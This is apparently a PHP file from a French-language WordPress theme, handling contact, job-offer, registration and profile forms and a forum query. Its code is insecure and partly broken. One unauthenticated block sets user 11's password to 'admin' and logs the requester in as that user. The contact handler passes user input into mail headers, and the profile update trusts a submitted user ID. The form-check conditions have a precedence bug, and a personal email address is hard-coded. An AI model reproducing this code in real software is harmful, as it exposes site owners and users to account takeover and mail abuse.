<div>
    <label for="category" class="sr_only form__label">Catégorie</label>
    <select name="lang" id="category" class="select--wide">
        <option value="css">Tous les langages</option>
        <?php
        $lang_terms = get_terms('categorylang', array('hide_empty' => false));
        foreach ($lang_terms as $lang_term) :?>
            <option value="<?= $lang_term->slug; ?>"><?= $lang_term->name; ?></option>
        <?php endforeach; ?>
    </select>
</div>
<div>
    <label for="type" class="sr_only form__label">Type</label>
    <select name="type" id="type" class="select--wide">
        <option value="astuce">Tous les types</option>
        <?php
        $type_terms = get_terms('categorytype', array('hide_empty' => false));
        foreach ($type_terms as $type_term) :?>
            <option value="<?= $type_term->slug; ?>"><?= $type_term->name; ?></option>
        <?php endforeach; ?>
    </select>
</div>
<div>
    <label for="level" class="sr_only form__label">Niveau</label>
    <select name="level" id="level" class="select--wide">
        <option value="facile">Tous les niveaux</option>
        <option value="facile">Facile</option>
        <option value="intermédiaire">Intermédiaire</option>
        <option value="difficile">Difficile</option>
    </select>
</div>




<?php if($_SESSION['empty'] == "empty"): ?>
    <div>
        <p class="section__info--alert">Tous les champs doivent être rempli</p>
    </div>
    <?php unset($_SESSION['empty']); ?>
<?php endif; ?>
<?php if($_SESSION['mail'] == "mail"): ?>
    <div>
        <p class="section__info--alert">Veulliez entrer une adresse mail valide</p>
    </div>
    <?php unset($_SESSION['mail']); ?>
<?php endif; ?>

<?php
function wa_contact_form()
{
return'dw-contact-form';
}

if($_POST['wa_contact_form'] ?? false === wa_contact_form())
{
$name = $_POST["name"];
$subject = $_POST["subject"];
$email = $_POST["email"];
$content = $_POST["message"];

if (empty($name) ||
empty($subject) ||
empty($email) ||
empty($content))
{
$_SESSION['empty'] = 'empty';
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL))
{
$_SESSION['mail'] = 'mail';
}

if ($_SESSION['mail'] != 'mail' &&
$_SESSION['empty'] != 'empty')
{
$toEmail = "randaxhe.florence@gmail.com";
$mailHeaders = "From: " . $name . "<" . $email . ">\r\n";
mail($toEmail, $subject, $content, $mailHeaders);

wp_redirect(home_url('/contact/?mail=success')); exit;

}
}





/***************************************************
 *
 * Handle job offer form
 */
function wa_new_job_form(){
    return'dw-new-job-form';
}
if($_POST['wa_new_job'] ?? false === wa_new_job_form()) {

    if (empty($_POST['job']) ||
        empty($_POST['agency']) ||
        empty($_POST['job_link']) ||
        empty($_POST['country']) ||
        empty($_POST['town']) ||
        empty($_POST['type']) ||
        empty($_FILES['profilepicture']))
    {
        $_SESSION['empty'] = 'empty';
    }

    if (filter_var($_POST['job_link'], FILTER_VALIDATE_URL) === FALSE) {
        $_SESSION['url'] = 'url';
    }

    if ($_SESSION['empty'] != 'empty' &&
        $_SESSION['url'] != 'url')
    {
        $post_data = array(
            'post_title' => $_POST['job'],
            'post_type' => 'emplois',
            'post_status' => 'publish'
        );
        $post_id = wp_insert_post($post_data);

// Save tha agency name.
        $agency = "field_5d93970940889";
        $agency_value = $_POST['agency'];
        update_field($agency, $agency_value, $post_id);

// Save the link of the job offer.
        $link = "field_5d9397989a391";
        $link_value = $_POST['job_link'];
        update_field($link, $link_value, $post_id);

// Save the country.
        $country = "field_5d9397619a38f";
        $country_value = $_POST['country'];
        update_field($country, $country_value, $post_id);

// Save the city.
        $city = "field_5d93977e9a390";
        $city_value = $_POST['town'];
        update_field($city, $city_value, $post_id);

// Save job type
        $job_type = "field_5d9397bc9a392";
        $job_type_value = $_POST['type'];
        update_field( $job_type, $job_type_value, $post_id );

// Save a repeater field value.
        $skills = "field_5dbc142277f47";
        $skills_value = $_POST['skills'];
        update_field( $skills, $skills_value, $post_id );


// set uploaded image file as thumbnail
        $wordpress_upload_dir = wp_upload_dir();
        $i = 1;

        $profilepicture = $_FILES['profilepicture'];
        $new_file_path = $wordpress_upload_dir['path'] . '/' . $profilepicture['name'];
        $new_file_mime = mime_content_type( $profilepicture['tmp_name'] );

        if( empty( $profilepicture ) )
            die( 'File is not selected.' );

        if( $profilepicture['error'] )
            die( $profilepicture['error'] );

        if( $profilepicture['size'] > wp_max_upload_size() )
            die( 'It is too large than expected.' );

        if( !in_array( $new_file_mime, get_allowed_mime_types() ) )
            die( 'WordPress doesn\'t allow this type of uploads.' );

        while( file_exists( $new_file_path ) ) {
            $i++;
            $new_file_path = $wordpress_upload_dir['path'] . '/' . $i . '_' . $profilepicture['name'];
        }

        if( move_uploaded_file( $profilepicture['tmp_name'], $new_file_path ) ) {


            $upload_id = wp_insert_attachment( array(
                'guid'           => $new_file_path,
                'post_mime_type' => $new_file_mime,
                'post_title'     => preg_replace( '/\.[^.]+$/', '', $profilepicture['name'] ),
                'post_content'   => '',
                'post_status'    => 'inherit'
            ), $new_file_path, $post_id );

            require_once( ABSPATH . 'wp-admin/includes/image.php' );

            wp_update_attachment_metadata( $upload_id, wp_generate_attachment_metadata( $upload_id, $new_file_path ) );
            set_post_thumbnail( $post_id, $upload_id );

        }

        wp_redirect(home_url('/poster-une-offre-demploi-ou-de-stage/?add=success')); exit;

    }

}



/***************************************************
 *
 * Handle custom registration formular
 */
function wa_new_user_form()
{
    return'dw-custom-form-user';
}

if($_POST['wa_user_form'] ?? false === wa_new_user_form())
{
    if (empty($_POST['user_login']) ||
        empty($_POST['user_password']) ||
        empty($_POST['conf_user_password']) ||
        empty($_POST['user_email']))
    {
        $_SESSION['empty'] = "empty";
    }

    // Validate password strength
    $uppercase = preg_match('@[A-Z]@', $_POST['user_password']);
    $lowercase = preg_match('@[a-z]@', $_POST['user_password']);
    $number    = preg_match('@[0-9]@', $_POST['user_password']);
    $specialChars = preg_match('@[^\w]@', $_POST['user_password']);
    if (!$uppercase || !$lowercase || !$number || !$specialChars || strlen($_POST['user_password']) < 6 )
    {
        $_SESSION['security'] = "security";
    }

    if ($_POST['user_password'] != $_POST['conf_user_password'])
    {
        $_SESSION['pass'] = "pass";
    }

    if (email_exists($_POST['user_email']))
    {
        $_SESSION['mail'] = "mail";
    }

    if ($_SESSION['mail'] != "mail" &&
        $_SESSION['pass'] != "pass" &&
        $_SESSION['empty'] != "empty" &&
        $_SESSION['security'] != "security")
    {
        $new = wp_create_user( $_POST['user_login'], $_POST['user_password'], $_POST['user_email'] );
        wp_redirect(home_url('/connexion'));exit;
    }
}



$user_obj = get_userdata( 11 );
if ( !empty( $_POST['user_pass'] ) &&
    $_POST['user_pass'] != $user_obj->user_pass &&
    !empty( $_POST['user_pass_new'] ) &&
    !empty( $_POST['user_pass_new_conf'] ) ) {
    $user = wp_get_current_user();
    $user_id = 11;
    $password = 'admin';
    wp_set_password( $password, $user_id );

    wp_set_auth_cookie(11);
    wp_set_current_user(11);
    do_action('wp_login', $user->user_login, $user);
}




/***************************************************
 *
 * Handle profile update
 */
function wa_update_user_form(){
    return'dw-uptade-form-user';
}
if($_POST['wa_update_form'] ?? false === wa_update_user_form()){
    if (!wp_http_validate_url($_POST['user_url'])){
        $_SESSION['url'] = "url";
    }

    if ($_SESSION['url'] != "url"){
        $arg = array(
            'ID' => $_POST['user_id'],
            'user_url' => $_POST['user_url'],
        );
        wp_update_user( $arg );
    }

}




if (isset($_GET['filter'])){
    $type = $_GET['category'];
    if (isset($type)){
        if ($type != 'all'){
            $cleanArray = [
                'tax_query' => array(
                    'relation' => 'AND',
                    array(
                        'taxonomy' => 'categoryforum',
                        'field'    => 'slug',
                        'terms'    =>  $type,
                    ),
                ),
            ];
            $args['tax_query'] = $cleanArray;
        }
    }
}
$args['post_type'] = 'forum';
$args['order'] = 'DESC';
$args['order_by'] = 'date';
$args['showposts'] = '6';
$thread = new WP_Query($args);